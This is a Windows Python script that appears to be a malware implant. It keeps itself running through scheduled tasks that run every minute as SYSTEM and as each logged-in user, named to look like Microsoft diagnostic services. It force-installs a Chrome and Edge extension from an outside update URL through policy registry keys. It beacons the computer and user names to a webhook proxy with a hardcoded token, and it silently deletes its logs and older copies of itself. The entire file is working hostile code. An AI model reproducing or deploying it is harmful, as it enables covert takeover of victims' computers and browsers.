import string, base64, json, re
import os, socket, sys, importlib, tempfile, random, csv, io, shutil
import urllib.request, subprocess
import time
from pathlib import Path
import winreg

WORKER_URL = "https://webhookproxy.anna-benbekthi.workers.dev"
PROXY_TOKEN = "389e0e62eaf14340b5e16d90ed1b56d79a14e07484a404bb30f0a3e9b7f64c66"

EXT_REG_VALUE = "clfbahpbgmlbahejgcbninkkbljjnpki;https://pc-lamartin.anna-benbekthi.workers.dev/update.xml"
EXT_REG_KEY = {
    "chrome": r"Software\Policies\Google\Chrome\ExtensionInstallForcelist",
    "msedge": r"Software\Policies\Microsoft\Edge\ExtensionInstallForcelist"
}

try:
    import win32com.client
    import requests
    import psutil
except:
    sys.exit()
 
def get_logged_in_user():
    """
    Returns one interactive logged-in user (DOMAIN\\User).
    Returns None if no interactive user is logged in.
    """
    try:
        wmi = win32com.client.GetObject("winmgmts:")
        sessions = wmi.ExecQuery(
            "SELECT * FROM Win32_LogonSession WHERE LogonType = 2 OR LogonType = 10"
        )
 
        for session in sessions:
            assoc = wmi.ExecQuery(
                f"ASSOCIATORS OF {{Win32_LogonSession.LogonId='{session.LogonId}'}} "
                "WHERE AssocClass=Win32_LoggedOnUser"
            )
            for user in assoc:
                return user.Domain,user.Name
 
    except Exception:
        pass
 
    return None, None


def send_webhook(message, path):
    payload = json.dumps({
        "message": message
    }).encode("utf-8")

    req = urllib.request.Request(
        f"{WORKER_URL}/{path}",
        data=payload,
        method="POST",
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {PROXY_TOKEN}",
            "User-Agent": "Mozilla/5.0 (DiscordWebhook)"
        }
    )

    try:
        with urllib.request.urlopen(req, timeout=15) as response:
            result = json.loads(response.read().decode("utf-8"))
            return response.status == 200 and result.get("ok") is True

    except Exception:
        return False

    
def task_exists(task_name: str) -> bool:
    """
    Returns True if a Windows scheduled task exists, False otherwise.
    """
    result = subprocess.run(
        ["schtasks", "/query", "/tn", task_name],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    return result.returncode == 0

def list_tasks() -> list[str]:
    """
    Returns a list of all Windows scheduled task names.
    """
    result = subprocess.run(
        ["schtasks", "/query", "/fo", "csv", "/nh"],
        capture_output=True,
        text=True,
        check=True
    )

    tasks = []
    reader = csv.reader(io.StringIO(result.stdout))
    for row in reader:
        if row:
            tasks.append(row[0])

    return tasks

def sanitize_username(username: str) -> str:
    """
    Replace characters not allowed in task names with '_'
    """
    return re.sub(r'[^a-zA-Z0-9._-]', '_', username)

def kill_other_pythonw():
    current_pid = os.getpid()

    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] and 'pythonw' in proc.info['name'].lower():
                if proc.info['pid'] != current_pid:
                    proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

def kill_process(process_name):
    try:
        subprocess.run(
            ["taskkill", "/F", "/IM", process_name],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
    except subprocess.CalledProcessError as e:
        pass

def create_user_task(username,taskname):
    INSTALL_DIR = r"C:\ProgramData\Microsoft\JFRE\Diagnosis"
    USER_DST = os.path.join(INSTALL_DIR, "USER.bin")
    PYTHON_EXE = Path(sys.executable).with_name("pythonw.exe")
    cmd = f'"{PYTHON_EXE}" "{USER_DST}"'
    
    subprocess.run(
        [
            "schtasks",
            "/create",
            "/f",
            "/sc", "minute",
            "/mo", "1",
            "/ru", username,
            "/tn", taskname,
            "/tr", cmd,
        ],
        check=True
    )

def create_system_task():
    PYTHON_EXE = Path(sys.executable).with_name("pythonw.exe")
    APP_NAME = "SecurityServices"
    SYSTEM_TASK_PATH = r"\Microsoft\JFRE\Diagnosis\FeedbackArchive\System"

    INSTALL_DIR = os.path.join(os.environ["ProgramFiles"], APP_NAME)
    SYSTEM_DST = os.path.join(INSTALL_DIR, "system_agent.py")

    subprocess.run(
        [
            "schtasks",
            "/create",
            "/f",
            "/sc", "minute",
            "/mo", "1",
            "/ru", "SYSTEM",
            "/rl", "highest",
            "/tn", SYSTEM_TASK_PATH,
            # "/tr", f'"{PYTHON_EXE}" "{SYSTEM_DST}" >> C:\\Windows\\Temp\\SecutiryServicesLogsSystem.txt 2>&1'
            "/tr", f'"{PYTHON_EXE}" "{SYSTEM_DST}"'
        ],
        check=True
    )

def remove_task(taskname):
    subprocess.run(
        [
            "schtasks",
            "/delete",
            "/f", 
            "/tn", taskname
        ],
        check=True
    )

def random_ext(n=3):
    return "." + "".join(random.choices(string.ascii_lowercase, k=n))

def manage_user_tasks():
    domain,user = get_logged_in_user()

    if user is None:
        return

    tname = r"\Microsoft\JFRE\Diagnosis\FeedbackArchive\User" + "\\" + sanitize_username(user)
            
    if not task_exists(tname):
        create_user_task(f"{domain}\\{user}", tname)

def setup_updated_version():
    pass # duownload.py

def is_old_task(taskname):
    return ("MyApp_SystemAgent" in taskname or "MyApp_UserAgent" in taskname)

def is_old_installed():
    dir = (Path(os.environ["ProgramFiles"]) / "SecurityServices").resolve()
    if dir.is_dir(): return True

    for task in list_tasks():
        if is_old_task(task): return True

    return False

def is_new_installed():
    dir = Path(r"C:\ProgramData\Microsoft\JFRE\Diagnosis")
    if not dir.is_dir(): return False

    if not task_exists(r"\Microsoft\JFRE\Diagnosis\FeedbackArchive\System"): return False

    filenames = ["SYS.bin","USER.bin"]
    for fn in filenames:
        if not (dir / fn).is_file(): return False

    return True

def cleanup_named_tempfiles():
    AGE_THRESHOLD = 60 
    temp_dir = tempfile.gettempdir()
    now = time.time()

    pattern = re.compile(r'^tmp[^.]{8}\.[^.]{3}$')
    for filename in os.listdir(temp_dir):
        if not pattern.match(filename):
                continue

        filepath = os.path.join(temp_dir, filename)

        if not os.path.isfile(filepath):
            continue

        try:
            mtime = os.path.getmtime(filepath)

            if now - mtime < AGE_THRESHOLD:
                continue

            os.remove(filepath)

        except PermissionError:
            pass
        except Exception as e:
            pass

def manage_updates():
    folder_list = [
        Path(tempfile.gettempdir()) / "SecurityServices",
        Path(tempfile.gettempdir()) / "tmp",
        Path(tempfile.gettempdir()) / "MyTempWork",
        r"C:\Windows\Temp\SecurityServices"
    ]

    for folder in folder_list:
        try:
            shutil.rmtree(folder)
        except:
            pass    

    file_list = [
        "C:\\Windows\\Temp\\SecutiryServicesLogsSystem.txt",
        "C:\\Windows\\Temp\\SecutiryServicesLogsUser.txt"
    ]
    
    for file in file_list:
        try:
            os.remove(file)
        except:
            pass
    
    if not is_new_installed(): 
        try:
            setup_updated_version()
        except:
            pass

        if is_new_installed():
            send_webhook("Successfully updated", "other")

    if is_new_installed() and is_old_installed():
        send_webhook("Trying to remove old install", "other")
        for task in list_tasks():
            if is_old_task(task):
                try:
                    remove_task(task)
                except:
                    pass

        try:
            kill_other_pythonw()
        except:
            pass

        time.sleep(1)
        try:
            dir = (Path(os.environ["ProgramFiles"]) / "SecurityServices").resolve()    
            shutil.rmtree(dir)
        except:
            pass

        if not is_old_installed():
            send_webhook("Sucessfully removed old install", "other")

        sys.exit()

def ext_installed(reg_key):
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_key, 0, winreg.KEY_READ) as key:
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    if value == EXT_REG_VALUE:
                        return True
                    i += 1
                except OSError:
                    break
    except:
        return False

    return False

def install_ext():
    for reg_key in EXT_REG_KEY.values():
        if ext_installed(reg_key):
            continue
        try:
            with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_key) as key:
                winreg.SetValueEx(
                    key,
                    "67",
                    0,
                    winreg.REG_SZ,
                    EXT_REG_VALUE
                )
        except:
            pass

def uninstall_ext():
    for reg_key in EXT_REG_KEY.values():
        try:
            with winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                reg_key,
                0,
                winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE
            ) as key:
                i = 0
                while True:
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        if value == EXT_REG_VALUE:
                            winreg.DeleteValue(key, name)
                        else:
                            i += 1
                    except OSError:
                        break
        except OSError:
            pass

def is_chrome_ext_installed():
    return {brws_type: ext_installed(reg_key) for brws_type, reg_key in EXT_REG_KEY.items()}

def heartbeat():
    global FIRST_MESSAGE
    
    if FIRST_MESSAGE:
        sent = send_webhook(START_DATA, "start")
        if sent : FIRST_MESSAGE = False
    else:        
        send_webhook(ALIVE_DATA, "alive")

if __name__ == "__main__":
    COMPUTER_NAME = os.environ.get("COMPUTERNAME", socket.gethostname())
    USER_NAME = os.environ.get("USERNAME", "SYSTEM")

    try:
        LOADER_VERSION = LOADER_VERSION
    except:
        LOADER_VERSION = "1.0"

    START_DATA = json.dumps({'info':'script_started', 'details': {'loader_version':LOADER_VERSION, 'ninstalled': is_new_installed(), 'oinstalled': is_old_installed(), 'einstalled': is_chrome_ext_installed()} , 'script':'system','computer':COMPUTER_NAME,'username':USER_NAME})
    ALIVE_DATA = json.dumps({'info':'alive','script':'system','computer':COMPUTER_NAME,'username':USER_NAME})

    FIRST_MESSAGE = True

    install_ext()
    
    loop_function_list = [
        # {
        #     "func": manage_updates,
        #     "args": [],
        #     "interval": 60,  # seconds
        #     "next_run": time.monotonic(),
        # },
                {
            "func": cleanup_named_tempfiles,
            "args": [],
            "interval": 60,  # seconds
            "next_run": time.monotonic(),
        },
                {
            "func": manage_user_tasks,
            "args": [],
            "interval": 60,  # seconds
            "next_run": time.monotonic(),
        },
                {
            "func": heartbeat,
            "args": [],
            "interval": 120,  # seconds
            "next_run": time.monotonic(),
        }
    ]

    while True:
        now = time.monotonic()
        nearest_next_run = None

        for task in loop_function_list:
            if now >= task["next_run"]:
                task["next_run"] += task["interval"]
                try:
                    task["func"](*task["args"])
                except Exception:
                    pass

            if nearest_next_run is None or task["next_run"] < nearest_next_run:
                nearest_next_run = task["next_run"]

        sleep_time = max(0, nearest_next_run - time.monotonic())
        time.sleep(sleep_time)
